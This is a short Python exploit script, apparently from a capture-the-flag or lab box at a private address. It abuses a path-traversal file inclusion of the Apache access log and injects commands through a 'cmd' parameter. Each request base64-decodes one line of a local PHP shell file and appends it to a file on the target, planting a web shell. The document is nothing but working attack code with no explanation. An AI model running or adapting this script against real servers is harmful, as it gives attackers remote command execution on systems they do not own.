#!/usr/bin/env python3

import requests
import base64

with open("phpshell.txt") as handle:
    lines = [base64.b64encode(bytes(x, "UTF-8")) for x in handle.readlines()]

url = "http://10.10.80.203/"

for line in lines:
    params = {
        "view": "./cat/../../../../var/log/apache2/access.log",
        "ext": "",
        "cmd": "echo " + str(line, "UTF-8") + " | base64 -d >> test.txt"
    }

    r = requests.get(url, params=params)